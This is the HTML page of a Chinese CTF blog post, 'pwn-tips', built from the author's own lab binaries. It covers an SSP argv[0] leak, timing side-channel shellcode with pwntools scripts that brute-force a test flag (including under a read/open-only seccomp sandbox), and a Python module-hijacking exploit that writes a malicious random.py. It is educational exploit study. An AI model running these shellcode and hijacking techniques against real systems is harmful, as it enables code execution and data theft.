@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <script type="application/javascript" src='https://ret2ldz.github.io/js/theme-mode.js'></script>
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/frameworks.min.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/github.min.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/github-style.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/light.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/dark.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/syntax.css' />
+    <title>pwn-tips - ldz&#39;s blog</title>
+    
+    <link rel="icon" type="image/x-icon" href='/images/github-mark.png'>
+    
+    <meta name="theme-color" content="#1e2327">
+
+    
+    
+
+    
+    <meta name="description"
+  content="一些小技巧" />
+<meta name="keywords"
+  content='blog, google analytics' />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://ret2ldz.github.io/post/pwn_tips/" />
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="pwn-tips - ldz&#39;s blog" />
+<meta name="twitter:description"
+  content="一些小技巧" />
+<meta name="twitter:site" content="https://ret2ldz.github.io/" />
+<meta name="twitter:creator" content="" />
+<meta name="twitter:image"
+  content="https://ret2ldz.github.io/">
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="pwn-tips - ldz&#39;s blog">
+<meta property="og:description"
+  content="一些小技巧" />
+<meta property="og:url" content="https://ret2ldz.github.io/post/pwn_tips/" />
+<meta property="og:site_name" content="pwn-tips" />
+<meta property="og:image"
+  content="https://ret2ldz.github.io/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+<body>
+  <div style="position: relative">
+  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
+    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
+      <a class="Header-link" href="https://ret2ldz.github.io/">
+        <img class="octicon" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item d-md-none">
+      <button class="Header-link btn-link js-details-target" type="button"
+        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
+        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
+          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
+          </path>
+        </svg>
+      </button>
+    </div>
+    <div style="display: none;" id="header-search"
+      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
+      <div
+        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
+        <div class="position-relative">
+          
+          <form target="_blank" id="search-form" action="" accept-charset="UTF-8" method="get"
+            autocomplete="off">
+            <label
+              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
+              <input type="text"
+                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
+                name="q" value="" placeholder="Search" autocomplete="off">
+            </label>
+          </form>
+          
+        </div>
+      </div>
+    </div>
+
+    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
+      <a class="Header-link " href="https://ret2ldz.github.io/">
+        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item" style="margin-right: 0;">
+      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
+        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
+          version="1.1" width="16" height="16">
+          <path fill-rule="evenodd" clip-rule="evenodd"
+            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
+          </path>
+        </svg>
+      </a>
+    </div>
+  </header>
+</div>
+
+  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
+</div>
+
+  
+<div class="application-main">
+  <div>
+  <main>
+    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
+      <div class="px-0">
+        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
+          <div class="flex-auto min-width-0 width-fit mr-3">
+            <div class="d-flex">
+              <div class="d-none d-md-block">
+                <a class="avatar mr-2 flex-shrink-0" href="https://ret2ldz.github.io/">
+                  <img class=" avatar-user"
+                    src="images/images.png"
+                    width="32" height="32"></a>
+              </div>
+              <div class="d-flex flex-column">
+                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
+                  <span class="author">
+                    <a href="https://ret2ldz.github.io/">ldz</a>
+                  </span>
+                  <span class="path-divider">/</span>
+                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
+                    <a href="https://ret2ldz.github.io/post/pwn_tips/">pwn-tips</a>
+                  </strong>
+                </h1>
+                <div class="note m-0">
+                  Created <relative-time datetime="Mon, 01 Jan 0001 00:00:00 &#43;0000"
+                    class="no-wrap">
+                    Mon, 01 Jan 0001 00:00:00 &#43;0000</relative-time>
+
+                  
+                  <span class="file-info-divider"></span>
+                  Modified <relative-time datetime="Sat, 20 Dec 2025 22:50:49 &#43;0800"
+                    class="no-wrap">
+                    Sat, 20 Dec 2025 22:50:49 &#43;0800</relative-time>
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-lg px-3 new-discussion-timeline">
+      <div class="repository-content gist-content">
+        <div>
+          <div class="js-gist-file-update-container js-task-list-container file-box">
+            <div id="file-pytest" class="file my-2">
+              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
+                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
+                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
+                    
+                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
+                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
+                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
+                      </svg>
+                    </summary>
+                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
+                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
+                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
+                        </div>
+                      </div>
+                    </details-menu>
+                      1831 Words
+                    
+
+                  </div>
+                  <div class="file-actions flex-order-2 pt-0">
+                    
+                    
+                    <a class="muted-link mr-3" href="/tags/pwn">
+                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
+                        <path fill-rule="evenodd"
+                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
+                        </path>
+                      </svg>
+                      pwn
+                    </a>
+                    
+                    
+                  </div>
+                </div>
+              </div>
+
+
+              <div class="Box-body px-5 pb-5" style="z-index: 1">
+                <article class="markdown-body entry-content container-lg"><h2 id="ssp-leak">ssp leak</h2>
+<p>覆盖__start栈帧的argv[0], 然后直接触发__stack_chk_fail</p>
+<pre tabindex="0"><code>void __attribute__ ((noreturn)) __stack_chk_fail (void) 
+{  
+    __fortify_fail (&#34;stack smashing detected&#34;); 
+} 
+void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) 
+{  
+    /* The loop is added only to keep gcc happy. */ 
+    while (1)   
+        __libc_message (2, &#34;*** %s ***: %s terminated\n&#34;,             
+                        msg, __libc_argv[0] ?: &#34;&lt;unknown&gt;&#34;); //这里覆盖就可以泄露
+}
+</code></pre><h2 id="side-channel">side-channel</h2>
+<p>闲来无事，复习一下好久没遇到过的<code>侧信道pwn</code></p>
+<p>基本的打法有时间侧信道，要基于下面这个shellcode，如果匹配正确会循环，如果匹配失败会报错，我们通过这种回显进行侧信道爆破。</p>
+<pre tabindex="0"><code>shellcode = &#39;&#39;&#39;
+    xor byte ptr [rdi+{}],{}
+    jz $
+&#39;&#39;&#39;
+</code></pre><p>我的想法使自己写两道题，一道题开沙箱只允许read、open；另一道题只读取8字节的输入。</p>
+<p><strong><code>自己给自己出题发现一个很有意思的事情，就是不能用scanf读取，因为我们遍历flag的时候遇到第十个字符的时候&quot;\x10&quot;会被解析成\n而被scanf截断。</code></strong></p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Desktop/cha]
+└─$ python3 sdc1
+b&#39;\x80w\n_t\xfe&#39;
+$
+</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[~/Desktop/cha]
+└─$ cat side-channel.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;time.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;seccomp.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;fcntl.h&gt;      // For open() and O_RDONLY
+#include &lt;sys/types.h&gt;  // For system data types
+#include &lt;sys/stat.h&gt;   // For file status flags
+
+void init(){
+    size_t size = 0x200; 
+    size_t size1 = 0x10;
+    mmap((void *)0x114514, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    mmap((void *)0x12345, size1, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    setvbuf(stderr, 0, 2, 0);
+    setvbuf(stdout, 0, 2, 0);
+    setvbuf(stdin, 0, 2, 0);
+    if (mprotect((void *)0x12000, size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
+        perror(&#34;mprotect failed&#34;);
+        exit(1);}
+}
+void readflag(){
+    int fd;
+    fd = open(&#34;./flag&#34;,O_RDONLY);
+    read(fd,(void *)0x114514,0x30);
+}
+void vuln(){
+    printf(&#34;Ok, let&#39;s begin.\n&#34;);
+    read(0,(void *)0x12345,0x8);    
+    void (*func)() = (void (*)())0x12345;
+    func((void *)0x114514);
+}
+int main(){
+    init();
+    readflag();
+    vuln();
+}
+                                                                                                                         
+┌──(kali㉿kali)-[~/Desktop/cha]
+└─$ python3 sdc
+6
+f
+fl
+fla
+flag
+flag{
+flag{T
+flag{Th
+flag{Thi
+flag{This
+flag{This_
+flag{This_i
+flag{This_is
+flag{This_is_
+flag{This_is_a
+flag{This_is_a_
+flag{This_is_a_T
+flag{This_is_a_Te
+flag{This_is_a_Tes
+flag{This_is_a_Test
+flag{This_is_a_Test1
+flag{This_is_a_Test11
+flag{This_is_a_Test111
+flag{This_is_a_Test111!
+flag{This_is_a_Test111!!
+flag{This_is_a_Test111!!!
+flag{This_is_a_Test111!!!}
+flag{This_is_a_Test111!!!}}
+
+┌──(kali㉿kali)-[~/Desktop/cha]
+└─$ cat sdc           
+from pwn import *
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;fatal&#39;)
+
+shellcode = &#39;&#39;&#39;
+    xor byte ptr [rdi+{}],{}
+    jz $
+&#39;&#39;&#39;
+print(len(asm(shellcode.format(10,80))))
+#b&#39;\x80w\x01\x02t\xfe&#39;
+
+flag = &#34;&#34;
+idx = 0
+k = string.printable
+p = [ord(x) for x in k]
+while True:
+    for i in p:
+        g = True
+        try:
+            io = process(&#39;./side-channel&#39;)
+            io.sendlineafter(b&#39;begin.\n&#39;,asm(shellcode.format(idx,i)))
+            #io.sendlineafter(b&#39;begin.\n&#39;,b&#39;\x80w&#39;+p8(idx)+p8(i)+b&#39;t\xfe&#39;)
+            m = io.can_recv(timeout=2)
+            io.close()
+            if not m:
+                flag += chr(i)
+                print(flag)
+                idx += 1
+                if chr(i)==&#34;}&#34;:
+                    print(flag+chr(i))
+                    io.close()
+            if m:
+                continue
+        except EOFError:
+            io.close()
+</code></pre><p>同理，orw的打法也大同小异。</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Desktop/cha]
+└─$ cat side-channel1.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;time.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;seccomp.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;fcntl.h&gt;      // For open() and O_RDONLY
+#include &lt;sys/types.h&gt;  // For system data types
+#include &lt;sys/stat.h&gt;   // For file status flags
+
+void
+init(){
+    size_t size = 0x200; 
+    size_t size1 = 0x10;
+    mmap((void *)0x114514, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    setvbuf(stderr, 0, 2, 0);
+    setvbuf(stdout, 0, 2, 0);
+    setvbuf(stdin, 0, 2, 0);
+    if (mprotect((void *)0x114000, size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
+        perror(&#34;mprotect failed&#34;);
+        exit(1);}
+}
+void
+sandbox(){
+    scmp_filter_ctx ctx;
+
+    ctx = seccomp_init(SCMP_ACT_KILL);
+    if (ctx == NULL) {
+        perror(&#34;seccomp_init&#34;);
+        exit(1);
+    }
+
+    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) &lt; 0) {
+        perror(&#34;seccomp_rule_add read&#34;);
+        seccomp_release(ctx);
+        exit(1);
+    }
+
+    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) &lt; 0) {
+        perror(&#34;seccomp_rule_add open&#34;);
+        seccomp_release(ctx);
+        exit(1);
+    }
+    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) &lt; 0) {
+        perror(&#34;seccomp_rule_add openat&#34;);
+        seccomp_release(ctx);
+        exit(1);
+    }
+
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
+    if (seccomp_load(ctx) &lt; 0) {
+        perror(&#34;seccomp_load&#34;);
+        seccomp_release(ctx);
+        exit(1);
+    }
+
+    seccomp_release(ctx);}
+
+void vuln(){
+    read(0,(void *)0x114514,0x100);     
+    void (*func)() = (void (*)())0x114514;
+    func();
+}
+int
+main(){
+    init();
+    sandbox();
+    vuln();
+}
+
+┌──(kali㉿kali)-[~/Desktop/cha]
+└─$ cat sdc1           
+from pwn import *
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;fatal&#39;)
+shellcode = &#39;&#39;&#39;
+    xor rax,rax
+    add rax,2
+    xor rsi,rsi
+    mov rdi,0x67616c662f2e
+    push rdi
+    mov rdi,rsp
+    syscall
+    mov rdi,rax
+    xor rax,rax
+    mov rsi,0x114614
+    mov rdx,0x30
+    syscall
+    mov rdi,rsi
+    xor byte ptr [rdi+{}],{}
+    jz $
+&#39;&#39;&#39;
+flag = &#34;&#34;
+idx = 0
+k = string.printable
+p = [ord(x) for x in k]
+while True:
+    for i in p:
+        g = True
+        try:
+            io = process(&#39;./side-channel1&#39;)
+            io.send(asm(shellcode.format(idx,i)))
+            m = io.can_recv(timeout=2)
+            io.close()
+            if not m:
+                flag += chr(i)
+                print(flag)
+                idx += 1
+                if chr(i)==&#34;}&#34;:
+                    print(flag+chr(i))
+                    io.close()
+            if m:
+                sleep(0.1)
+                continue
+        except EOFError:
+            io.close()
+</code></pre><h2 id="python-module-hijacking">Python module Hijacking</h2>
+<p>这是一种针对于python的打法，笔者是在Actf2025看到有一个队这么偷菜的，因此这里记录并且复现一下，<code>它的原理是python在import库的时候会先解析当前文件夹同名的文件作为库文件</code>，因此我们可以用shellcode创建一个里面放满我们的恶意代码。</p>
+<p>要实现这种打法，首先要有个python代码写的wrapper，笔者将会自己写一个类似的并且通过复现打法实现getshell。</p>
+<pre tabindex="0"><code>┌──(root㉿kali)-[/home/kali/Desktop/cha]
+└─# cat vuln.c        
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;fcntl.h&gt;      // For open() and O_RDONLY
+#include &lt;sys/types.h&gt;  // For system data types
+#include &lt;sys/stat.h&gt;   // For file status flags
+
+int
+main(){
+    int fd;
+    int size = 0x200;
+    fd = open(&#34;shellcode.bin&#34;,0);
+    mmap((void *)0x1234567, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    // Set RWX permissions on the buffer
+    if (mprotect((void *)0x1234000, size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
+        perror(&#34;mprotect failed&#34;);
+        exit(1);
+    }
+    read(fd,(void *)0x1234567,0x200);
+    void (*func)() = (void (*)())0x1234567;
+    func();
+}
+                                                                                                                         
+┌──(root㉿kali)-[/home/kali/Desktop/cha]
+└─# cat wrapper.py
+#!/usr/bin/python3
+import os
+import random
+import string
+import signal
+import pathlib
+import sys
+def recv_shellcode() -&gt; bytes:
+    result = b&#34;&#34;
+    try:
+        while True:
+            print(&#34;&gt; &#34;, flush=True)
+            line_content = input().strip()
+            if not line_content:
+                break
+            result += bytes.fromhex(line_content)
+    except Exception as err:
+        print(&#34;Bad input format&#34;, flush=True)
+        exit(-1)
+
+    print(f&#34;receive in total {len(result)} bytes, move on ...&#34;)
+    return result
+
+shellcode = recv_shellcode()
+output_file = &#34;./shellcode.bin&#34; 
+k = random.choice(string.hexdigits)
+print(shellcode)
+with open(output_file, &#34;wb&#34;) as f:
+    f.write(shellcode)
+os.system(&#34;./vuln&#34;)
+</code></pre><p>经过本地测试，<strong><code>只有以root权限连接才能实现，因为linux的权限管理极其严格导致非root权限生成的库无可执行权限</code></strong>。</p>
+<pre tabindex="0"><code>┌──(root㉿kali)-[/home/kali/Desktop/cha]
+└─# python3 exp       
+[+] Starting local process &#39;./wrapper.py&#39;: pid 19309
+148
+/home/kali/Desktop/cha/exp:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  io.sendline(asm(sc).hex()+b&#39;#&#39;.hex()*0x10)
+[*] Switching to interactive mode
+&gt; 
+&gt; 
+receive in total 164 bytes, move on ...
+b&#34;jyH\xb8random.pPH\x89\xe71\xd2jB^j\x02X\x0f\x05H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8`f&amp;(\x0b\x01\x01\x01H1\x04$H\xb8cat ./flPH\xb8system(&#39;PH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8u!nr\x0bnr/H1\x04$H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8xr\x0bhlqnsH1\x04$H\xb8import sPH\x89\xe6j\x04_j-Zj\x01X\x0f\x05################&#34;
+Segmentation fault (core dumped)
+[*] Got EOF while reading in interactive
+$ 
+[*] Interrupted
+[*] Process &#39;./wrapper.py&#39; stopped with exit code 0 (pid 19309)
+                                                                                                                         
+┌──(root㉿kali)-[/home/kali/Desktop/cha]
+└─# python3 exp
+flag{This_is_a_Test111!!!}
+Traceback (most recent call last):
+  File &#34;/home/kali/Desktop/cha/exp&#34;, line 1, in &lt;module&gt;
+    from pwn import *
+  File &#34;/usr/lib/python3/dist-packages/pwn/__init__.py&#34;, line 4, in &lt;module&gt;
+    from pwn.toplevel import *
+  File &#34;/usr/lib/python3/dist-packages/pwn/toplevel.py&#34;, line 15, in &lt;module&gt;
+    import tempfile
+  File &#34;/usr/lib/python3.12/tempfile.py&#34;, line 184, in &lt;module&gt;
+    from random import Random as _Random
+ImportError: cannot import name &#39;Random&#39; from &#39;random&#39; (/home/kali/Desktop/cha/random.py)
+
+┌──(root㉿kali)-[/home/kali/Desktop/cha]
+└─# cat exp       
+from pwn import *
+io = process(&#39;./wrapper.py&#39;)
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
+fake_module = &#39;&#39;&#39;import sys
+import os
+os.system(&#39;cat ./flag&#39;)
+&#39;&#39;&#39;
+sc = shellcraft.amd64.open(&#34;random.py&#34;,66) #2(READ_ONLY)|64(CREATE) = 66
+sc += shellcraft.amd64.write(4,fake_module,len(fake_module))
+print(len(asm(sc)))
+io.sendline(asm(sc).hex()+b&#39;#&#39;.hex()*0x10)
+io.sendline()
+io.interactive()
+</code></pre></article>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<script type="application/javascript" src='https://ret2ldz.github.io/js/toc.js'></script>
+<link rel="stylesheet" href='https://ret2ldz.github.io/css/toc.css' />
+
+  
+<div id="gitalk-container" class="gitalk-container"></div>
+<link rel="stylesheet" href='https://ret2ldz.github.io/css/gitalk.css'>
+<script src='https://ret2ldz.github.io/js/gitalk.min.js'></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: 'Your client ID',
+    clientSecret: 'Your client secret',
+    repo: 'ret2ldz.github.io',
+    owner: 'ventusoon',
+    admin: ['ventusoon'],
+    id: eval("location.pathname"), 
+    distractionFreeMode: false 
+  });
+  (function() {
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+</div>
+
+  <div class="footer container-xl width-full p-responsive">
+  <div
+    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
+    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="https://ret2ldz.github.io/">
+      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
+        <path fill-rule="evenodd"
+          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+        </path>
+      </svg>
+    </a>
+    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
+      
+      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
+      
+      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
+    </ul>
+  </div>
+  <div class="d-flex flex-justify-center pb-6">
+    <span class="f6 text-gray-light"></span>
+  </div>
+
+
+</div>
+
+</body>
+
+<script type="application/javascript" src="https://ret2ldz.github.io/js/github-style.js"></script>
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/fuse.js/dist/fuse.min.js"></script>
+<script type="application/javascript" src='https://ret2ldz.github.io/js/search.js'></script>
+
+
+
+</html>
